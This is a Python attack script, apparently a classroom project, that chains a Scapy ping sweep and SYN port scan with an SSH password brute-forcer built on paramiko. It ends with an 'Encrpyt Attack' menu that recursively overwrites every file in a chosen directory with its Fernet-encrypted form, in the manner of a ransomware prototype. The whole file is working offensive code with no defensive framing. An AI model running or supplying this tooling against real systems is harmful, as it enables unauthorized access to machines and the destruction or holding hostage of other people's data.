#!/usr/bin/python3
# Created by Omar Ardid adn Cody Blahnik
import subprocess
from cryptography.fernet import Fernet
from scapy.layers.inet import IP, TCP, ICMP
from scapy.sendrecv import sr1, send
import ipaddress
import logging
import time
import paramiko, os, sys, socket
import zipfile

# Suppressing Scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Scan a specific port on a target IP address
def scan_port(target_ip, port):
    try:
        # Creating an IP packet with TCP layer
        ip_pkt = IP(dst=target_ip)
        tcp_pkt = TCP(dport=port, flags="S")
        # Sending the packet and receiving a response
        response = sr1(ip_pkt/tcp_pkt, timeout=0.1, verbose=0)
        if response:
            # Checking the flags in response
            if response.haslayer(TCP):
                flags = response.getlayer(TCP).flags
                # Checking if flags is set to 0x12
                if flags == 0x12: # SYN-ACK check
                    send(ip_pkt/TCP(dport=port, flags="R"), verbose=0)
                    print(f"Port {port} is open")
                # Checking if flags is set to 0x14
                elif flags == 0x14: # RST-ACK check
                    print(f"Port {port} is closed")
                else:
                    print(f"Port {port} is filtered and silently dropped")
        else:
            print(f"Port {port} is filtered and silently dropped")
    except Exception as e:
        print(f"An error occurred while scanning port {port}: {e}")

# Perform ICMP ping sweep on a network and scan open ports on responsive hosts
def icmp_ping_and_scan(target_ip, ports):
    online_count = 0
    # Check if the input is a single IP address
    if "/" not in target_ip:
        # Check if the provided IP address is valid
        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            print("Invalid IP address provided.")
            return

        # Creating ICMP packet and sending it 
        pkt = IP(dst=target_ip) / ICMP()
        resp = sr1(pkt, timeout=0.1, verbose=0)
        # Check response 
        if resp is None:
            print(f"Host {target_ip} is down or unresponsive.")
            return
        elif resp.haslayer(ICMP) and resp[ICMP].type == 3 and resp[ICMP].code in [1, 2, 3, 9, 10, 13]:
            print(f"Host {target_ip} is actively blocking ICMP traffic.")
            return
        else:
            print(f"Host {target_ip} is responding.")
            online_count += 1
            # Scan ports if host is responsive
            for port in ports:
                scan_port(target_ip, port)
    else:
        # Create an IP network variable
        network_address = ipaddress.ip_network(target_ip, strict=False)
        for ip in network_address.hosts():
            ip = str(ip)
            # Run through each host in the network (excluding network and broadcast addresses)
            if ipaddress.ip_address(ip) in [network_address.network_address, network_address.broadcast_address]:
                continue
            # Creating ICMP packet and sending it 
            pkt = IP(dst=ip) / ICMP()
            resp = sr1(pkt, timeout=0.1, verbose=0)
            # Check response 
            if resp is None:
                print(f"Host {ip} is down or unresponsive.")
            elif resp.haslayer(ICMP) and resp[ICMP].type == 3 and resp[ICMP].code in [1, 2, 3, 9, 10, 13]:
                print(f"Host {ip} is actively blocking ICMP traffic.")
            else:
                print(f"Host {ip} is responding.")
                online_count += 1
                # Scan ports if host is responsive
                for port in ports:
                    scan_port(ip, port)
    
    # Print the total number of online hosts if it's not a single IP address
    if "/" in target_ip:
        print(f"\n{online_count} hosts are online.")

# Function to read passwords from a file
def read_passwords(password_file):
    # Open the file in read mode
    with open(password_file, "r") as file:
        # Read each line, strip trailing whitespace, and return as a list
        return [line.rstrip() for line in file]

# Function to check if a file path is valid    
def check_filepath(file_path, file_description):
    # Check if the given path is a valid file
    if not os.path.isfile(file_path):
        print(f"(ง •̀_•́)ง {file_description} not found. Please enter a valid file path!")
        # Return False if the file is not found
        return False
    # Return True if the file path is valid
    return True

def ssh_brute_force(target_ip):    
    # Prompt the user for target host address, SSH username, and password file path
    username = input("Enter SSH Username: ")
    input_file = input("Enter SSH Password File: ")

    # Checks if file path exists
    if not check_filepath(input_file, "Password file"):
        return

    try:
        # Open password file in read mode
        with open(input_file, 'r') as file:
            # Iterate over each password in the file
            for password in file:
                # Remove trailing whitespace from password
                password = password.rstrip()
                try:
                    # Create an SSH Client instance
                    ssh = paramiko.SSHClient()
                    # Set policy for automatically adding host keys
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    # Attempt SSH connection using the current password
                    print(f"Trying password: {password}")
                    ssh.connect(target_ip, port=22, username=username, password=password, banner_timeout=10, auth_timeout=10)
                    # Close the SSH connection
                    # ssh.close()
                    # Print success message if password is correct
                    print(f"٩(◕‿◕)۶ Success! Password found: {password}")
                    return
                except paramiko.AuthenticationException:
                    # Print error message if authentication fails
                    print(f"(.づ◡ ﹏◡)づ. Failed! incorrect password: {password}")
                except socket.error as e:
                    # Print error message if a socket error occurs
                    print(f"(`･︿´･ ) An error occurred: {e}")
                except paramiko.SSHException as e:
                    # Handle other SSH exceptions
                    print(f"(`･︿´･ ) SSH error occurred: {e}")
                    time.sleep(1)  # Sleep briefly to avoid overwhelming the server
    except KeyboardInterrupt:
        # Print message if user interrupts the process
        print("User Requested An Interrupt")
        # Exit the program
        sys.exit(3)

# Function to generate and write a key to a file
def write_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

# Function to load the key from a file
def load_key():
    return open("key.key", "rb").read()

# Function to encrypt a file
def encrypt_file(file_path, key):
    try:
        f = Fernet(key)
        with open(file_path, "rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(file_path, "wb") as file:
            file.write(encrypted_data)
        print("File encrypted successfully!")
    except Exception as e:
        print(f"Error encrypting file: {e}")

# Function to decrypt a file
def decrypt_file(file_path, key):
    try:
        f = Fernet(key)
        with open(file_path, "rb") as file:
            encrypted_data = file.read()
        decrypted_data = f.decrypt(encrypted_data)
        with open(file_path, "wb") as file:
            file.write(decrypted_data) 
        print("File decrypted successfully!")
    except FileNotFoundError:
        print(f"Error: Encrypted file '{file_path}' not found.")
    except Exception as e:
        print(f"Error decrypting file: {e}")

def encrypt_directory(directory_path, key):
    # Using Recursively to encrypt all files in the specified directory and its subdirectories
    for root, dirs, files in os.walk(directory_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            encrypt_file(file_path, key) # Encrypt each file
    print("Directory has been encrypted!")

def decrypt_directory(directory_path, key):
    # Using Recursively to decrypt all files in the specified directory and its subdirectories
    for root, dirs, files in os.walk(directory_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            decrypt_file(file_path, key) # Decrypt each file
    print("Directory has been decrypted!")

def menu():
    while True:
        print("\n~~~~~ Encrpyt Attack ~~~~~")
        print("1. Encrpyt Directory and all its contents")
        print("2. Decrpyt Directory and all its contents")
        print("0. Exit")
        choice = input("Enter a number: ")

        if choice == "1":
            write_key() # Generating a key
            key = load_key() # Load that generated key into "key" variable
            folder_path = input("Enter the folder path to encrypt: ")
            encrypt_directory(folder_path, key) # Encrypts the specified directory
        elif choice == "2":
            key = load_key() # Loading the key
            folder_path = input("Enter the folder path to decrypt: ")
            decrypt_directory(folder_path, key) # Decrypt the specified directory
        elif choice == "0":
            print("(づ ◕‿◕ )づ Goodbye!")
            break
        else:
            print("\nง •̀_•́)ง Invalid number! ")

if __name__ == "__main__":
    target_ip = input("Enter the target IP address or network (e.g., 192.168.1.1 or 192.168.1.0/24): ")
    icmp_ping_and_scan(target_ip, [22, 80, 443, 3389])
    ssh_brute_force(target_ip)
    menu()